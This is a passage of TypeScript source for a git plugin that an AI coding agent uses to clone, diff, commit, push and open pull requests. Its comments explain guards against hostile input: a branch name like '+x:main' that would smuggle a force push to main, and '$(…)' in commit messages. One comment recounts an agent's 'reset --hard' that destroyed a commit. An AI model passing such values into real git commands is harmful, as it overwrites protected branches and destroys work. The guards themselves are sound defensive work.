          repo: `${parsed.owner}/${parsed.repo}`,
          branch: landed,
          fresh: true
        });
        return `cloned to ${dir} on branch ${landed}`;
      }
    }),

    repo_status: tool({
      description: "Show which files changed in the checkout.",
      inputSchema: z.object({ dir: z.string().describe("Checkout directory") }),
      execute: async ({ dir }) => {
        const result = await plain("status --short", dir);
        // "(no changes)" is a claim about the tree. A command that failed
        // supports no claim about anything, and reporting one as the other sends
        // the model on to commit against a repository it cannot read.
        if (!result.success) {
          logFailure("repo_status", result);
          return bounded(
            `could not read the status of ${dir}: ${result.stderr || result.stdout}`
          );
        }
        return bounded(result.stdout.trim()) || "(no changes)";
      }
    }),

    repo_diff: tool({
      description:
        "Show the current diff. Read this before committing — it is the cheapest way to catch an edit that did more than you intended. Pass stat:true first on a large change to see which files moved and by how much, then read the full diff of what matters.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        staged: z.boolean().optional().describe("Show staged changes instead"),
        stat: z
          .boolean()
          .optional()
          .describe(
            "Summarise as a per-file changed-line count instead of the full patch"
          )
      }),
      execute: async ({ dir, staged, stat }) => {
        const flags = [staged ? "--staged" : "", stat ? "--stat" : ""]
          .filter(Boolean)
          .join(" ");
        const result = await plain(`diff ${flags}`, dir);
        // Same reasoning as `repo_status`: "(no diff)" and "the diff could not
        // be read" are opposite answers, and this is the tool a reviewing agent
        // trusts most.
        if (!result.success) {
          logFailure("repo_diff", result);
          return bounded(
            `could not read the diff in ${dir}: ${result.stderr || result.stdout}`
          );
        }
        // Truncated from the middle rather than the end: the head of a diff and
        // its tail are both informative, and the middle of a large one rarely
        // is. A model that needs the part that was dropped can ask for `stat`
        // and then read the file.
        return bounded(result.stdout.trim()) || "(no diff)";
      }
    }),

    repo_commit: tool({
      description:
        "Stage everything and commit. Write the message for a reviewer reading it in the log a year from now: what changed and why, not how.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        message: z.string().describe("Commit message")
      }),
      execute: async ({ dir, message }) => {
        // Checked rather than fired and forgotten. A failed `add` leaves the
        // index holding less than the model believes, and the commit that
        // follows still succeeds — so the round reports a commit that quietly
        // does not contain the change.
        const staged = await plain("add -A", dir);
        if (!staged.success) {
          logFailure("repo_commit", staged);
          return bounded(
            `could not stage the changes in ${dir}: ${staged.stderr || staged.stdout}`
          );
        }
        // The message is model-authored free text — quotes, backticks, newlines,
        // `$(…)`. Expanded from the environment inside the container, all of
        // that is inert; interpolated into the command string, none of it is.
        const result = await plain(`commit -m "$GIT_COMMIT_MESSAGE"`, dir, {
          GIT_COMMIT_MESSAGE: message
        });
        if (!result.success && /nothing to commit/i.test(result.stdout))
          return "nothing to commit — the working tree is clean";
        if (!result.success) {
          logFailure("repo_commit", result);
          return bounded(`commit failed: ${result.stderr || result.stdout}`);
        }
        return bounded(result.stdout.trim());
      }
    }),

    repo_push: tool({
      description:
        "Push a branch to the remote. Refuses to push to a protected branch and refuses to force-push — open a pull request instead.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        branch: z
          .string()
          .describe(
            "Branch name to create and push, e.g. 'coder/add-json-flag'"
          )
      }),
      execute: async ({ dir, branch }) => {
        // Enforced here rather than in the prompt: a guardrail a model can talk
        // itself out of is not a guardrail.
        //
        // Shape first, then the name. `git push origin <name>` reads `<name>`
        // as a refspec, so `+x:main` is a force push to main that the name
        // check below would wave through — it only ever sees a literal string.
        if (UNSAFE_BRANCH.test(branch))
          return `"${branch}" is not a plain branch name — use something like "coder/add-json-flag"`;
        if (PROTECTED_BRANCHES.has(branch))
          return `refusing to push to "${branch}" — push a work branch and open a pull request`;

        // The repository's *own* default, which is often none of the four names
        // above: a repo whose trunk is `release` deserves the same protection.
        // A command that never ran stops here rather than standing the guards
        // down — the same rule as the two probes further down, and the reason
        // {@link resolveDefaultBranch} reports the two separately.
        const head = await resolveDefaultBranch(plain, dir);
        if (head.unreachable)
          return bounded(`could not push "${branch}": ${head.unreachable}`);
        const defaultBranch = head.branch;
        if (defaultBranch && defaultBranch === branch)
          return `refusing to push to "${branch}" — it is this repository's default branch; push a work branch and open a pull request`;

        const { remote, unreachable } = await origin(dir);
        if (unreachable)
          return bounded(`could not push "${branch}": ${unreachable}`);
        if (!remote)
          return `${dir} has no origin on an allowed host — clone it with repo_clone first`;

        // Switch to the branch, or create it — but never *reset* it.
        //
        // This was `checkout -B`, which is create-or-reset, and the difference
        // destroyed real work. The sequence that did it, verbatim from a
        // production run: the model committed on the default branch, ran
        // `git branch coder/x` to save the commit, then `git checkout main &&
        // git reset --hard origin/main` to tidy up. `checkout -B coder/x` then
        // force-moved the branch it had just made back to `origin/main`, so the
        // commit existed only as an unreferenced object. Had the credential been
        // working, this would have pushed an empty branch and opened a pull
        // request on it — a silent, complete loss dressed up as success.
        const exists = await plain(
          `rev-parse --verify --quiet "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        // Same reasoning as the probe in `repo_clone`: `!success` means "no such
        // branch, create it" only when git was there to say so.
        if (exists.unreachable)
          return bounded(`could not push "${branch}": ${exists.stderr}`);
        const checkout = await plain(
          exists.success
            ? `checkout "$REPO_BRANCH"`
            : `checkout -b "$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        if (!checkout.success) {
          logFailure("repo_push", checkout);
          return bounded(
            `could not switch to branch "${branch}": ${checkout.stderr || checkout.stdout}`
          );
        }

        // Nothing to push is a bug upstream of here, not a no-op.
        //
        // A branch level with the default branch means the commit went
        // somewhere else, or was never made. Pushing it succeeds, `repo_open_pr`
        // opens an empty pull request, and the round reports a URL as if the
        // work had landed — the one outcome worse than an error. Skipped rather
        // than failed when the baseline cannot be resolved: a repository with no
        // `origin/HEAD` is unusual but legitimate, and guessing is worse than
        // not guarding.
        if (defaultBranch) {
          const ahead = await plain(
            `rev-list --count "origin/$REPO_BASE..HEAD"`,
            dir,
            {
              REPO_BASE: defaultBranch
            }
          );
          if (ahead.success && ahead.stdout.trim() === "0") {
            return (
              `refusing to push "${branch}" — it has no commits that origin/${defaultBranch} ` +
              `does not already have, so the pull request would be empty. Check repo_status ` +
              `and repo_diff: either the change was never committed, or it was committed on ` +
              `a different branch.`
            );
          }
        }

        // A pre-flight check, not a value anyone downstream consumes: `push`
        // takes the branch *name* and resolves it itself, against the same
        // files. What this buys is the failure arriving here, where the sentence
        // can name the branch and the checkout, instead of surfacing as a push
        // that rejects a ref nobody can see.
        const tip = await plain(
          `rev-parse --verify "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        if (!tip.success || !tip.stdout.trim()) {
          logFailure("repo_push", tip);
          return bounded(
            `could not resolve "${branch}" to a commit: ${tip.stderr || tip.stdout}`
          );
        }

        const result = await pushBranch(dir, remote.url, branch);
        if (!result.success) {
          logFailure("repo_push", result);
          return bounded(`push failed: ${result.stderr || result.stdout}`);
        }

        // What `--set-upstream` used to do as a side effect of the push. Written
        // here because the push no longer happens in this repository, and a
        // subagent that reaches for a bare `git push` in the shell should still
        // find the branch tracking something.
        //
        // Checked, but *reported* rather than raised: this is the one place in
        // the plugin where a failed command is genuinely not a failed operation.
        // The push has landed by now — saying so is the important half — and all
        // that is lost is the convenience these two keys buy. Firing them and
        // forgetting was the other extreme, in a file whose whole theme is that
        // an unchecked command is a claim nobody made.
        const remoteSet = await plain(
          `config "branch.$REPO_BRANCH.remote" origin`,
          dir,
          { REPO_BRANCH: branch }
        );
        const mergeSet = await plain(
          `config "branch.$REPO_BRANCH.merge" "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        const untracked = [remoteSet, mergeSet].find((r) => !r.success);
        if (untracked) {
          // Named apart from the push, which succeeded — a log line reading
          // "repo_push failed" next to a branch that is on the remote is worse
          // than no log line.
          logFailure("repo_push (upstream tracking)", untracked);
          return bounded(
            `pushed ${branch}, but could not record what it tracks: ` +
              `${untracked.stderr || untracked.stdout}\n` +
              `The push itself landed. The only consequence is local: a bare ` +
              `\`git push\` from the shell will not know where to send this ` +
              `branch, and needs \`git push -u origin ${branch}\` once.`
          );
        }
        return `pushed ${branch}`;
      }
    }),

    repo_open_pr: tool({
      description:
        "Open a pull request for a pushed branch and return its URL. Do this once the branch is pushed and the tests pass.",
      inputSchema: z.object({
        url: z.string().describe("The repository URL the branch was pushed to"),
        head: z.string().describe("The branch you pushed"),
        base: z.string().describe("The branch to merge into, e.g. 'main'"),
        title: z.string().describe("Pull request title"),
        body: z
          .string()
          .describe(
            "Pull request description — what changed and why, and how you verified it"
          )
      }),
      execute: async ({ url, head, base, title, body }) => {
        const parsed = parseRepo(url, allowedHosts);
        if (!parsed)
          return `could not parse an owner/repo out of ${url} on an allowed host`;

        // Encoded, not interpolated raw. These come from a model-supplied URL,
        // and an owner containing `?` or `#` would otherwise re-point the
        // request at a different endpoint on the same API.
        const owner = encodeURIComponent(parsed.owner);
        const repo = encodeURIComponent(parsed.repo);

        // Deliberately from the Worker, not the container: this is the only
        // credential that can write to the repository through the API, and it
        // never crosses into the container.
        //
        // Bounded and caught, which the rest of this plugin got for free from
        // `exec` and this call did not. An API that never answers otherwise holds
        // the round open until something further out gives up, and a rejected
        // `fetch` left as a tool error tells the model less than it needs — the
        // one thing it must know is that a POST that timed out may have been
        // received anyway.
        let response: Response;
        try {
          response = await fetch(`${apiBase}/repos/${owner}/${repo}/pulls`, {
            method: "POST",
            headers: {
              authorization: `Bearer ${config.token()}`,
              accept: "application/vnd.github+json",
              "content-type": "application/json",
              "user-agent": "looping-coder"
            },
            body: JSON.stringify({ title, head, base, body }),
            signal: AbortSignal.timeout(PR_TIMEOUT_MS)
          });
        } catch (err) {
          logFailure("repo_open_pr", { stderr: String(err) });
          return (
            `could not reach ${apiBase} to open the pull request: ${String(err)}\n` +
            `The request may have been received anyway — check whether the pull ` +
            `request already exists before retrying, or the retry will open a ` +
            `second one alongside it.`
          );
        }

        if (!response.ok) {
          // `.catch` rather than a bare await: this is the error path already,
          // and a body that will not read must not replace the status that
          // explains the failure.
          const detail = await response.text().catch(() => "");
          logFailure("repo_open_pr", {
            exitCode: response.status,
            stderr: detail
          });
          return `could not open the pull request (${response.status}): ${detail.slice(0, 500)}`;
        }
        const pr = (await response.json().catch(() => ({}))) as {
          html_url?: string;
        };
        return (
          pr.html_url ?? "pull request opened, but the response carried no URL"
        );
      }
    }),

    repo_issue_view: tool({
      description:
        "Read an issue or pull request from the repository you have checked out: its title, state, description and comments. Use this when a task refers to an issue number, before guessing what it asks for.",
      inputSchema: z.object({
        dir: z.string().describe("The checkout directory"),
        number: z.number().int().positive().describe("Issue or PR number")
      }),
      execute: async ({ dir, number }) => {
        const target = await forgeRepo(dir);
        if ("refusal" in target) return target.refusal;
        const { owner, repo } = target;

        // The issues endpoint, deliberately, even for a pull request: GitHub
        // models every PR as an issue, and this is the one that carries the
        // discussion. `repo_pr_view` is for the parts that are only a PR's.
        const issue = await forge(
          "repo_issue_view",
          `/repos/${owner}/${repo}/issues/${number}`
        );
        if (!issue.ok) return bounded(issue.message);
        const data = issue.data as {
          title?: string;
          state?: string;
          user?: { login?: string };
          body?: string;
          pull_request?: unknown;
        };

        const comments = await forge(
          "repo_issue_view",
          `/repos/${owner}/${repo}/issues/${number}/comments`
        );
        // A failure here is not a failure of the tool: the issue itself was
        // read, and half an answer beats none.
        const thread = (
          comments.ok && Array.isArray(comments.data) ? comments.data : []
        ) as { user?: { login?: string }; body?: string }[];

        return bounded(
          [
            `#${number} ${data.title ?? "(no title)"} [${data.state ?? "?"}]` +
              (data.pull_request ? " (pull request)" : ""),
            `opened by ${data.user?.login ?? "unknown"}`,
            "",
            data.body?.trim() || "(no description)",
            ...thread.map(
              (c) =>
                `\n--- ${c.user?.login ?? "unknown"} ---\n${c.body?.trim() ?? ""}`
            ),
            ...(comments.ok ? [] : [`\n(comments could not be read)`])
          ].join("\n")
        );
      }
    }),

    repo_pr_view: tool({
      description:
        "Read a pull request's state and the files it touches — whether it is mergeable, its review state, and which paths changed. Use this to check on a pull request you opened, or to see what an existing one does before duplicating it.",
      inputSchema: z.object({
        dir: z.string().describe("The checkout directory"),
        number: z.number().int().positive().describe("Pull request number")
      }),
      execute: async ({ dir, number }) => {
        const target = await forgeRepo(dir);
        if ("refusal" in target) return target.refusal;
        const { owner, repo } = target;

        const pr = await forge(
          "repo_pr_view",
          `/repos/${owner}/${repo}/pulls/${number}`
        );
        if (!pr.ok) return bounded(pr.message);
        const data = pr.data as {
          title?: string;
          state?: string;
          draft?: boolean;
          merged?: boolean;
          mergeable?: boolean | null;
          head?: { ref?: string };
          base?: { ref?: string };
          html_url?: string;
        };

        const files = await forge(
          "repo_pr_view",
          `/repos/${owner}/${repo}/pulls/${number}/files`
        );
        const changed = (
          files.ok && Array.isArray(files.data) ? files.data : []
        ) as { filename?: string; additions?: number; deletions?: number }[];

        return bounded(
          [
            `#${number} ${data.title ?? "(no title)"}`,
            `${data.merged ? "merged" : (data.state ?? "?")}` +
              (data.draft ? " (draft)" : "") +
              // `mergeable` is computed asynchronously by GitHub and is `null`
              // until it has been, which is common on a pull request opened
              // seconds ago — exactly when this tool is most likely to be called.
              (data.mergeable === null
                ? ", mergeability not yet computed"
                : data.mergeable === false
                  ? ", NOT mergeable"
                  : ""),
            `${data.head?.ref ?? "?"} → ${data.base?.ref ?? "?"}`,
            data.html_url ?? "",
            "",
            changed.length
              ? changed
                  .map(
                    (f) =>
                      `  ${f.filename ?? "?"} (+${f.additions ?? 0} -${f.deletions ?? 0})`
                  )
                  .join("\n")
              : files.ok
                ? "  (no files reported)"
                : "  (changed files could not be read)"
          ].join("\n")
        );
      }
    }),

    repo_pr_comment: tool({
      description:
        "Leave a comment on a pull request or issue in the repository you have checked out. Use this to report what you did, or to answer a review — not to announce work you have not finished.",
      inputSchema: z.object({
        dir: z.string().describe("The checkout directory"),
        number: z
          .number()
          .int()
          .positive()
          .describe("Pull request or issue number"),
        body: z.string().describe("The comment, as markdown")
      }),
      execute: async ({ dir, number, body }) => {
        const target = await forgeRepo(dir);
        if ("refusal" in target) return target.refusal;
        const { owner, repo } = target;

        const posted = await forge(
          "repo_pr_comment",
          `/repos/${owner}/${repo}/issues/${number}/comments`,
          { method: "POST", body: { body } }
        );
        if (!posted.ok)
          // The same hazard `repo_open_pr` names, for the same reason: a POST
          // whose answer never arrived may still have been received, and a blind
          // retry is how one comment becomes two.
          return bounded(
            `${posted.message}\nIf this was a timeout rather than a rejection the ` +
              `comment may exist anyway — read it back with repo_issue_view before retrying.`
          );
        const data = posted.data as { html_url?: string };
        return data.html_url ?? `commented on #${number}`;
      }
    })
  };
}

export function repo(config: RepoConfig): AgentPlugin {
  return definePlugin({
    key: "repo",

    mainAgentTools: () => buildRepoTools(config),

    // The runtime state goes through to `exec` untouched, so a delegated
    // subtask's git commands run in the same container its parent cloned into.
    toolFamilies: {
      [REPO_FAMILY]: (ctx) => ({ tools: buildRepoTools(config, ctx.runtime) })
    },

    capability: [
      "You can work with git repositories:",
      "- `repo_clone` checks one out into the workspace. The checkout may already be there from an earlier task, in which case it is fetched and reset for you — but if it has uncommitted changes it is left as-is, and you should read them with `repo_diff` before deciding what to do.",
      "- `repo_status` and `repo_diff` show what you have changed — read the diff before committing. On a large change call `repo_diff` with `stat: true` first to see which files moved, then read the ones that matter; output is truncated from the middle when it is large.",
      "- `repo_commit` stages everything and commits.",
      "- `repo_push` pushes a work branch. It refuses the default branch and other protected names, and it refuses a branch carrying no commits the default branch does not already have — that is not negotiable.",
      "- `repo_open_pr` opens the pull request and returns its URL.",
      "Never push to the default branch. Finish by opening a pull request and reporting its URL."
    ].join("\n"),

    requires: { secrets: ["GITHUB_TOKEN"] }
  });
}
